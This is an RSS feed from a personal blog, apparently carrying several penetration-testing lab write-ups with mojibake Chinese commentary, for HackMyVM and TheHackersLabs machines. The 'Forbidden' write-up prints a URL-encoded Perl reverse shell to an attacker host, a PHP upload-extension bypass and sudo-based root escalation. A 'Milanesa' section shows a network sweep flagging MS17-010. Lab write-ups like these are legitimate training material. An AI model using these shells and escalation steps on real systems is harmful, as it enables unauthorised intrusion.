-rwxrwxrwx    1 0        0             241 Oct 09  2020 index.html
-rwxrwxrwx    1 0        0              75 Oct 09  2020 note.txt
-rwxrwxrwx    1 0        0              10 Oct 09  2020 robots.txt
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# cat robots.txt  
/note.txt
                                                                                                               
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# cat note.txt  
The extra-secured .jpg file contains my password but nobody can obtain it.
                                                                                                               
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# cat index.html 
&lt;h1&gt;SECURE WEB/FTP&lt;h1&gt;

Hi, Im the best admin of the world.
You cannot execute .php code on this server so you cannot
obtain a reverse shell. Not sure if its misconfigured another things... but
the importart is that php is disabled.

-marta
<br>å°±æ˜¯è¯´ä»–æŠŠä»–çš„å¯†ç æ”¾åˆ°äº†ä¸€ä¸ªjpgæ–‡ä»¶é‡Œé¢<br><br>è¿™é‡Œæ²¡å¿…è¦æ‰«ç›®å½•äº†ã€‚å› ä¸ºæˆ‘ä»¬ftpè¿æ¥ä¸Šå»çš„å°±æ˜¯ç½‘ç«™ç›®å½•<br>è¿™é‡Œæ‰«ä¸€ä¸‹udpæœåŠ¡<br>çœ‹æœ‰æ²¡æœ‰å…¶ä»–å¼€å‘çš„udpç«¯å£<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# nmap -sU 192.168.9.12  -p 1-100
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-06 12:56 CST
Nmap scan report for 192.168.9.12
Host is up (0.00058s latency).
Not shown: 99 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
MAC Address: 08:00:27:2E:11:DB (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 114.69 seconds
<br>ä¹Ÿæ²¡æœ‰ä»€ä¹ˆä¸œè¥¿<br>æ ¹æ®é¦–é¡µçš„æç¤º è¯´Phpé…ç½®å¯èƒ½ä¼šæœ‰çªç ´å£ã€‚<br>ç»•è¿‡Phpä¸æ–­ä¿®æ”¹phpåç¼€å<br>Php|php2|php3|php4|php5|php6|php7|pht|phtm|phtml
<br>å‘ç°.php5å¯ä»¥è¢«è§£æ<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.002.png" referrerpolicy="no-referrer"><br>ç›´æ¥å¼¹shell<br>perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.9.3%22%3B%24p%3D1122%3Bsocket%28S%2CPF\_INET%2CSOCK\_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr\_in%28%24p%2Cinet\_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27
<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.003.png" referrerpolicy="no-referrer"><br><br>(remote) www-data@forbidden:/tmp$ find / -perm -4000 2&gt;/dev/null
/home/marta/.forbidden
/usr/bin/mount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/su
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
(remote) www-data@forbidden:/tmp$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:
<br>æ‰§è¡Œè¿™ä¸ªæ–‡ä»¶åè·å–åˆ°äº†markosçš„ç”¨æˆ·æƒé™<br>è¿™æ˜¯.forbiddenæ–‡ä»¶é€†å‘åçš„ä»£ç <br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.004.png" referrerpolicy="no-referrer"><br><br>è·å–åˆ°markosçš„æƒé™åï¼Œçœ‹ä¸€ä¸‹sudo -l å‘ç°æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿<br>ä¹‹å‰æœ‰æç¤ºå¯†ç å¸¸åœ¨.jpgé‡Œé¢<br>ç›´æ¥æ‰¾ä¸€ä¸‹å½“å‰ç”¨æˆ·å¯ä»¥è®¿é—®çš„jpgæ–‡ä»¶<br>find / -name \*.jpg
/var/www/html/TOPSECRETIMAGE.jpg
<br>åªæœ‰è¿™ä¸€å¼ å›¾ç‰‡æ˜¯å¯ä»¥è®¿é—®çš„<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.005.jpeg" referrerpolicy="no-referrer"><br>åº”è¯¥å°±æ˜¯ä¸€ä¸ªmiscé—®é¢˜äº†<br>è¯•äº†å‡ ç§è§£æ³•å‘ç°ä¸å¯¹<br>å¯èƒ½æ–‡ä»¶åå­—å°±æ˜¯å¯†ç <br>å¯†ç å°±æ˜¯TOPSECRETIMAGE<br>markos@forbidden:~/html$ su marta
Password: 
marta@forbidden:/var/www/html$ sudo -l
Matching Defaults entries for marta on forbidden:
    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User marta may run the following commands on forbidden:
    (ALL : ALL) NOPASSWD: /usr/bin/join
<br>joinè¯»æ–‡ä»¶<br> marta@forbidden:/var/www/html$ sudo join -a 2 /dev/null /root/root.txt
HMVmymymymymind
<br>ä¹Ÿå¯ä»¥ç”¨joinè¯»å–peterç”¨æˆ·çš„å¯†ç hash ç„¶åç”¨hashcatè¿›è¡Œçˆ†ç ´<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.006.png" referrerpolicy="no-referrer"><br>peterç”¨æˆ·çš„å¯†ç æ˜¯boomer<br><br>peter@forbidden:/var/www/html$ sudo -l
Matching Defaults entries for peter on forbidden:
    env\_reset, mail\_badpass, secure\_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User peter may run the following commands on forbidden:
    (ALL : ALL) NOPASSWD: /usr/bin/setarch
<br>peter@forbidden:/var/www/html$ sudo setarch x86\_64 /bin/bash
root@forbidden:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
root@forbidden:/var/www/html# 
<br><br>é€ æˆPhp5åç¼€å¯ä»¥è¢«è§£æçš„åŸå› æ˜¯<br>/etc/nginx/sites-available/default ä¸­é…ç½®äº†<br>location ~ \.php5$ {
                include snippets/fastcgi-php.conf;
]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/10.forbidden.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/10.Forbidden.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/10.Forbidden.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[1.Gift]]></title><description><![CDATA[ 
 <br><br>
<br>
<a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
1.Gift

<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.001.png" referrerpolicy="no-referrer"><br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.002.png" referrerpolicy="no-referrer"><br>æ‰«æä¸€ä¸‹ç›®å½•<br>å•¥ä¹Ÿæ²¡æœ‰<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.003.png" referrerpolicy="no-referrer"><br>ç½‘ç«™çœ‹ä¸‹æºç <br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.004.png" referrerpolicy="no-referrer"><br>çœ‹æ¥æ˜¯çœŸçš„simpleäº†<br>ç”¨simple sshç»“æœç›´æ¥å°±è¿æ¥ä¸Šå»äº†<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.005.png" referrerpolicy="no-referrer"><br>PS: å‡ ä¸ªæœˆå‰å°±å¼€å§‹è¯´è¦æ‰“HVMäº†ã€‚ç»“æœæ‹–äº†è¿™ä¹ˆä¹…æ‰å¼€å§‹æ‰“ã€‚æœ€è¿‘ç„æœºæ‰“çš„å·®ä¸å¤šäº†ã€‚ä½œä¸ºHVMæ‰“çš„ç¬¬ä¸€ä¸ªé¶æœºã€‚ç‰¹æ„é€‰äº†ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„ã€‚ï¼ˆä½†ç¡®å®æ˜¯å¤ªç®€å•äº† ï¼‰]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/1.gift.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/1.Gift.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/1.Gift.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[0.virtualboxç½‘ç»œé…ç½®]]></title><description><![CDATA[ 
 <br>0.virtualbox ç½‘ç»œé…ç½®<br>ä½¿ç”¨Host-onlyæ¨¡å¼<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/0.virtualbox%20%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.001.png" referrerpolicy="no-referrer"><br>vmwareçš„kaliæ¡¥æ¥virtualboxçš„ç½‘å¡å³å¯<br><img alt="..." src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/0.virtualbox%20%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.002.png" referrerpolicy="no-referrer">]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/0.virtualboxç½‘ç»œé…ç½®.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/0.virtualboxç½‘ç»œé…ç½®.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/0.virtualbox%20%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.001.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/0.virtualbox%20%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE.001.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[9.Binary Trail]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. å¯ç–‘äºŒè¿›åˆ¶æ–‡ä»¶çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ" data-href="#2. å¯ç–‘äºŒè¿›åˆ¶æ–‡ä»¶çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ" href="https://www.c1trus.top/about:blank#2._å¯ç–‘äºŒè¿›åˆ¶æ–‡ä»¶çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ" class="internal-link" target="_self" rel="noopener nofollow">2. å¯ç–‘äºŒè¿›åˆ¶æ–‡ä»¶çš„åç§°æ˜¯ä»€ä¹ˆï¼Ÿ</a>
<br><a data-tooltip-position="top" aria-label="3. äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ç³»ç»Ÿä¸­éšè—äº†å“ªä¸ªæ–‡ä»¶ï¼Ÿ" data-href="#3. äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ç³»ç»Ÿä¸­éšè—äº†å“ªä¸ªæ–‡ä»¶ï¼Ÿ" href="https://www.c1trus.top/about:blank#3._äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ç³»ç»Ÿä¸­éšè—äº†å“ªä¸ªæ–‡ä»¶ï¼Ÿ" class="internal-link" target="_self" rel="noopener nofollow">3. äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ç³»ç»Ÿä¸­éšè—äº†å“ªä¸ªæ–‡ä»¶ï¼Ÿ</a>
<br><a data-tooltip-position="top" aria-label="4. äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ç³»ç»Ÿæ—¥å¿—ä¸­ç•™ä¸‹äº†å“ªäº›å‘½ä»¤çš„ç—•è¿¹ï¼Ÿ" data-href="#4. äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ç³»ç»Ÿæ—¥å¿—ä¸­ç•™ä¸‹äº†å“ªäº›å‘½ä»¤çš„ç—•è¿¹ï¼Ÿ" href="https://www.c1trus.top/about:blank#4._äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ç³»ç»Ÿæ—¥å¿—ä¸­ç•™ä¸‹äº†å“ªäº›å‘½ä»¤çš„ç—•è¿¹ï¼Ÿ" class="internal-link" target="_self" rel="noopener nofollow">4. äºŒè¿›åˆ¶æ–‡ä»¶åœ¨ç³»ç»Ÿæ—¥å¿—ä¸­ç•™ä¸‹äº†å“ªäº›å‘½ä»¤çš„ç—•è¿¹ï¼Ÿ</a>
<br><a data-tooltip-position="top" aria-label="5. åœ¨å“ªä¸ªæ—¥å¿—æ–‡ä»¶ä¸­å‘ç°äº†è¿™äº›ç—•è¿¹ï¼Ÿï¼ˆè·¯å¾„ï¼‰" data-href="#5. åœ¨å“ªä¸ªæ—¥å¿—æ–‡ä»¶ä¸­å‘ç°äº†è¿™äº›ç—•è¿¹ï¼Ÿï¼ˆè·¯å¾„ï¼‰" href="https://www.c1trus.top/about:blank#5._åœ¨å“ªä¸ªæ—¥å¿—æ–‡ä»¶ä¸­å‘ç°äº†è¿™äº›ç—•è¿¹ï¼Ÿï¼ˆè·¯å¾„ï¼‰" class="internal-link" target="_self" rel="noopener nofollow">5. åœ¨å“ªä¸ªæ—¥å¿—æ–‡ä»¶ä¸­å‘ç°äº†è¿™äº›ç—•è¿¹ï¼Ÿï¼ˆè·¯å¾„ï¼‰</a>
<br><a data-tooltip-position="top" aria-label="6. éšè—æ–‡ä»¶ /etc/.shadow_auth çš„æƒé™æ˜¯å¤šå°‘ï¼Ÿï¼ˆæ•°å­—å½¢å¼ï¼‰" data-href="#6. éšè—æ–‡ä»¶ /etc/.shadow_auth çš„æƒé™æ˜¯å¤šå°‘ï¼Ÿï¼ˆæ•°å­—å½¢å¼ï¼‰" href="https://www.c1trus.top/about:blank#6._éšè—æ–‡ä»¶_/etc/.shadow_auth_çš„æƒé™æ˜¯å¤šå°‘ï¼Ÿï¼ˆæ•°å­—å½¢å¼ï¼‰" class="internal-link" target="_self" rel="noopener nofollow">6. éšè—æ–‡ä»¶ /etc/.shadow_auth çš„æƒé™æ˜¯å¤šå°‘ï¼Ÿï¼ˆæ•°å­—å½¢å¼ï¼‰</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://thehackerslabs.com/binary-trail/" target="_blank">https://thehackerslabs.com/binary-trail/</a><br>
éš¾åº¦ â­ï¸â­ï¸ï¸
<br><br>ä½¿ç”¨ find å‘½ä»¤æœç´¢éæ ‡å‡†ç›®å½•ä¸­çš„å¯ç–‘äºŒè¿›åˆ¶æ–‡ä»¶ ä¸”ä¿®æ”¹æ—¶é—´å¤§äº2024-12-20<br>root@oscar:~# find / -type f -executable -not -path "/bin/*" -not -path "/usr/*" -not -path "/sbin/*" -newermt 2024-12-20 2&gt;/dev/null
/etc/grub.d/01_password
/etc/grub.d/10_linux
/opt/auth_proxy
<br>
/etc/grub.d/ æ˜¯ GRUB å¼•å¯¼åŠ è½½ç¨‹åºçš„é…ç½®è„šæœ¬ç›®å½• 10_linux é€šå¸¸è´Ÿè´£åŠ è½½ Linux å†…æ ¸ æ‰€ä»¥åŸºæœ¬å¯ä»¥æ’é™¤ä¸Šé¢ä¸¤ä¸ª<br>
/opt ä¸€èˆ¬æ˜¯ç¬¬ä¸‰æ–¹ç¨‹åºçš„å®‰è£…ç›®å½•ï¼Œæ‰€ä»¥è¿™ä¸ªå¯ç–‘ç¨‹åºå°±æ˜¯ auth_proxy
<br><br>åˆ©ç”¨ strings å‘½ä»¤è¿›è¡Œæå– å«æœ‰ / çš„å­—ç¬¦ä¸²ã€‚ä¸€èˆ¬æ–‡ä»¶éƒ½ä¼šä¸è¿™ä¸ªæœ‰å…³<br>root@oscar:~# strings /opt/auth_proxy | grep "/"
/lib64/ld-linux-x86-64.so.2
touch /etc/.shadow_auth

<br>/etc/.shadow_auth<br><br>æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—å³å¯<br>root@oscar:~# strings /var/log/auth.log.1 | grep "auth_proxy"
Dec 21 10:32:45 server auth_proxy: touch /etc/.shadow_auth
Dec 21 10:32:45 server auth_proxy: Probando creaci
Dec 21 10:32:45 server auth_proxy: touch /etc/.shadow_auth
Dec 21 10:32:45 server auth_proxy: Probando creaci
Dec 21 10:32:45 server auth_proxy: touch /etc/.shadow_auth
Dec 21 10:32:45 server auth_proxy: Probando creaci

<br>touch<br>
ä¸Šé¢æ‰§è¡Œ strings /opt/auth_proxy | grep "/" æ—¶å°±ç»™å‡ºäº†è¿™ä¸ªå‘½ä»¤<br><br>æˆ‘ä»¬åœ¨ /var/log/auth.log.1 é‡Œé¢å‘ç°äº†ç—•è¿¹ï¼Œä½†å› ä¸ºæ—¥å¿—æ–‡ä»¶çš„è½®è½¬æœºåˆ¶ï¼Œæ‰€ä»¥å…¶å®æ˜¯æ—¥å¿—æ–‡ä»¶ /var/log/auth.log è¿™é‡Œé¢çš„å†…å®¹<br><br>root@oscar:~# stat -c "%a" /etc/.shadow_auth
600

<br>600]]></description><link>https://www.c1trus.top/24-æ¸—é€/thl/9.binary-trail.html</link><guid isPermaLink="false">24-æ¸—é€/THL/9.Binary Trail.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate></item><item><title><![CDATA[8.Milanesa]]></title><description><![CDATA[ 
 <br>****## 1. åŸºæœ¬ä¿¡æ¯^toc<br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>
<br><a data-tooltip-position="top" aria-label="3. ms17-010" data-href="#3. ms17-010" href="https://www.c1trus.top/about:blank#3._ms17-010" class="internal-link" target="_self" rel="noopener nofollow">3. ms17-010</a>
<br><a data-tooltip-position="top" aria-label="4. PTH" data-href="#4. PTH" href="https://www.c1trus.top/about:blank#4._PTH" class="internal-link" target="_self" rel="noopener nofollow">4. PTH</a>

<br><a data-tooltip-position="top" aria-label="4.1. mimikatzæŠ“å–åŸŸæ§hash" data-href="#4.1. mimikatzæŠ“å–åŸŸæ§hash" href="https://www.c1trus.top/about:blank#4.1._mimikatzæŠ“å–åŸŸæ§hash" class="internal-link" target="_self" rel="noopener nofollow">4.1. mimikatzæŠ“å–åŸŸæ§hash</a>


<br><a data-tooltip-position="top" aria-label="5. ç½‘ç«™åˆ©ç”¨" data-href="#5. ç½‘ç«™åˆ©ç”¨" href="https://www.c1trus.top/about:blank#5._ç½‘ç«™åˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">5. ç½‘ç«™åˆ©ç”¨</a><br>
- <a data-tooltip-position="top" aria-label="5.1. ç›®å½•æ‰«æ" data-href="#5.1. ç›®å½•æ‰«æ" href="https://www.c1trus.top/about:blank#5.1._ç›®å½•æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">5.1. ç›®å½•æ‰«æ</a><br>
- <a data-tooltip-position="top" aria-label="5.2. ç™»å½•æ¡†åˆ©ç”¨" data-href="#5.2. ç™»å½•æ¡†åˆ©ç”¨" href="https://www.c1trus.top/about:blank#5.2._ç™»å½•æ¡†åˆ©ç”¨" class="internal-link" target="_self" rel="noopener nofollow">5.2. ç™»å½•æ¡†åˆ©ç”¨</a><br>
é¶æœºé“¾æ¥<br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸ï¸
<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# fscan -h 20.20.20.0/24

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 2.0.0
[*] æ‰«æç±»å‹: all, ç›®æ ‡ç«¯å£: 21,22,80,81,135,139,443,445,1433,1521,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017,80,81,82,83,84,85,86,87,88,89,90,91,92,98,99,443,800,801,808,880,888,889,1000,1010,1080,1081,1082,1099,1118,1888,2008,2020,2100,2375,2379,3000,3008,3128,3505,5555,6080,6648,6868,7000,7001,7002,7003,7004,7005,7007,7008,7070,7071,7074,7078,7080,7088,7200,7680,7687,7688,7777,7890,8000,8001,8002,8003,8004,8006,8008,8009,8010,8011,8012,8016,8018,8020,8028,8030,8038,8042,8044,8046,8048,8053,8060,8069,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,8100,8101,8108,8118,8161,8172,8180,8181,8200,8222,8244,8258,8280,8288,8300,8360,8443,8448,8484,8800,8834,8838,8848,8858,8868,8879,8880,8881,8888,8899,8983,8989,9000,9001,9002,9008,9010,9043,9060,9080,9081,9082,9083,9084,9085,9086,9087,9088,9089,9090,9091,9092,9093,9094,9095,9096,9097,9098,9099,9100,9200,9443,9448,9800,9981,9986,9988,9998,9999,10000,10001,10002,10004,10008,10010,10250,12018,12443,14000,16080,18000,18001,18002,18004,18008,18080,18082,18088,18090,18098,19001,20000,20720,21000,21501,21502,28018,20880
[*] å¼€å§‹ä¿¡æ¯æ‰«æ...
[*] CIDRèŒƒå›´: 20.20.20.0-20.20.20.255
[*] å·²ç”ŸæˆIPèŒƒå›´: 20.20.20.0 - 20.20.20.255
[*] å·²è§£æCIDR 20.20.20.0/24 -&gt; IPèŒƒå›´ 20.20.20.0-20.20.20.255
[*] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256
[+] ç›®æ ‡ 20.20.20.1      å­˜æ´» (ICMP)
[+] ç›®æ ‡ 20.20.20.7      å­˜æ´» (ICMP)
[+] ç›®æ ‡ 20.20.20.4      å­˜æ´» (ICMP)
[+] ç›®æ ‡ 20.20.20.2      å­˜æ´» (ICMP)
[+] ç›®æ ‡ 20.20.20.6      å­˜æ´» (ICMP)
[+] ç›®æ ‡ 20.20.20.3      å­˜æ´» (ICMP)
[+] ç›®æ ‡ 20.20.20.5      å­˜æ´» (ICMP)
[+] ICMPå­˜æ´»ä¸»æœºæ•°é‡: 7
[*] å…±è§£æ 218 ä¸ªæœ‰æ•ˆç«¯å£
[+] ç«¯å£å¼€æ”¾ 20.20.20.7:22
[+] ç«¯å£å¼€æ”¾ 20.20.20.3:80
[+] ç«¯å£å¼€æ”¾ 20.20.20.6:80
[+] ç«¯å£å¼€æ”¾ 20.20.20.6:139
[+] ç«¯å£å¼€æ”¾ 20.20.20.5:139
[+] ç«¯å£å¼€æ”¾ 20.20.20.5:135
[+] ç«¯å£å¼€æ”¾ 20.20.20.4:135
[+] ç«¯å£å¼€æ”¾ 20.20.20.4:139
[+] ç«¯å£å¼€æ”¾ 20.20.20.6:445
[+] ç«¯å£å¼€æ”¾ 20.20.20.3:443
[+] ç«¯å£å¼€æ”¾ 20.20.20.3:139
[+] ç«¯å£å¼€æ”¾ 20.20.20.3:135
[+] ç«¯å£å¼€æ”¾ 20.20.20.1:135
[+] ç«¯å£å¼€æ”¾ 20.20.20.6:135
[+] ç«¯å£å¼€æ”¾ 20.20.20.1:139
[+] ç«¯å£å¼€æ”¾ 20.20.20.4:445
[+] ç«¯å£å¼€æ”¾ 20.20.20.5:445
[+] ç«¯å£å¼€æ”¾ 20.20.20.3:445
[+] ç«¯å£å¼€æ”¾ 20.20.20.1:445
[+] ç«¯å£å¼€æ”¾ 20.20.20.4:88
[+] ç«¯å£å¼€æ”¾ 20.20.20.3:3306
[+] ç«¯å£å¼€æ”¾ 20.20.20.1:7680
[+] ç«¯å£å¼€æ”¾ 20.20.20.1:7890
[+] ç«¯å£å¼€æ”¾ 20.20.20.6:3306
[+] ç«¯å£å¼€æ”¾ 20.20.20.5:8080
[+] å­˜æ´»ç«¯å£æ•°é‡: 25
[*] å¼€å§‹æ¼æ´æ‰«æ...
[!] æ‰«æé”™è¯¯ 20.20.20.1:445 - read tcp 20.20.20.7:34666-&gt;20.20.20.1:445: read: connection reset by peer
[!] æ‰«æé”™è¯¯ 20.20.20.6:445 - read tcp 20.20.20.7:34600-&gt;20.20.20.6:445: read: connection reset by peer
[!] æ‰«æé”™è¯¯ 20.20.20.3:445 - read tcp 20.20.20.7:58318-&gt;20.20.20.3:445: read: connection reset by peer
[*] NetInfo
[*] 20.20.20.1
   [-&gt;] yu
   [-&gt;] 192.168.1.1
   [-&gt;] 192.168.8.1
   [-&gt;] 192.168.56.1
   [-&gt;] 10.16.9.188
   [-&gt;] 10.10.10.1
   [-&gt;] 20.20.20.1
   [-&gt;] 30.30.30.1
   [-&gt;] 2409:8760:1e81:10::2:6dc6
[!] æ‰«æé”™è¯¯ 20.20.20.5:445 - read tcp 20.20.20.7:57976-&gt;20.20.20.5:445: read: connection reset by peer
[*] NetBios 20.20.20.1      WORKGROUP\YU
[*] NetInfo
[*] 20.20.20.5
   [-&gt;] Milanesa1
   [-&gt;] 30.30.30.5
   [-&gt;] 10.10.10.5
   [-&gt;] 20.20.20.5
   [-&gt;] 192.168.56.112
[*] NetBios 20.20.20.3      HACKME\WIN-SEUNA992K57
[*] NetInfo
[*] 20.20.20.3
   [-&gt;] WIN-SEUNA992K57
   [-&gt;] 192.168.56.11
   [-&gt;] 10.10.10.3
   [-&gt;] 20.20.20.3
   [-&gt;] 30.30.30.3
[!] æ‰«æé”™è¯¯ 20.20.20.1:7680 - Get "https://20.20.20.1:7680": EOF
[*] ç½‘ç«™æ ‡é¢˜ http://20.20.20.6         çŠ¶æ€ç :503 é•¿åº¦:326    æ ‡é¢˜:Service Unavailable
[*] NetInfo
[*] 20.20.20.6
   [-&gt;] WIN-11ULVN883E8
   [-&gt;] 192.168.56.12
   [-&gt;] 10.10.10.6
   [-&gt;] 20.20.20.6
   [-&gt;] 30.30.30.6
[*] NetBios 20.20.20.6      WORKGROUP\WIN-11ULVN883E8
[*] NetInfo
[*] 20.20.20.4
   [-&gt;] WIN-M5KV71CEGO8
   [-&gt;] 30.30.30.6
   [-&gt;] 20.20.20.4
   [-&gt;] 30.30.30.4
   [-&gt;] 10.10.10.4
[!] æ‰«æé”™è¯¯ 20.20.20.4:88 - Get "http://20.20.20.4:88": read tcp 20.20.20.7:60944-&gt;20.20.20.4:88: read: connection reset by peer
[*] ç½‘ç«™æ ‡é¢˜ https://20.20.20.3        çŠ¶æ€ç :302 é•¿åº¦:0      æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: https://20.20.20.3/dashboard/
[*] NetBios 20.20.20.5      WORKGROUP\MILANESA1
[*] ç½‘ç«™æ ‡é¢˜ http://20.20.20.3         çŠ¶æ€ç :302 é•¿åº¦:0      æ ‡é¢˜:æ— æ ‡é¢˜ é‡å®šå‘åœ°å€: http://20.20.20.3/dashboard/
[*] ç½‘ç«™æ ‡é¢˜ http://20.20.20.5:8080    çŠ¶æ€ç :200 é•¿åº¦:4755   æ ‡é¢˜:Milanesas Argentinas
[+] MS17-010 20.20.20.4 (Windows Server 2016 Standard 14393)
[*] NetBios 20.20.20.4      [+] DC:WIN-M5KV71CEGO8.hackme.thl      Windows Server 2016 Standard 14393
[*] ç½‘ç«™æ ‡é¢˜ http://20.20.20.1:7890    çŠ¶æ€ç :400 é•¿åº¦:0      æ ‡é¢˜:æ— æ ‡é¢˜
[*] ç½‘ç«™æ ‡é¢˜ http://20.20.20.3/dashboard/ çŠ¶æ€ç :200 é•¿åº¦:5187   æ ‡é¢˜:Welcome to XAMPP
[!] æ‰«æé”™è¯¯ 20.20.20.1:7890 - Get "https://20.20.20.1:7890": EOF
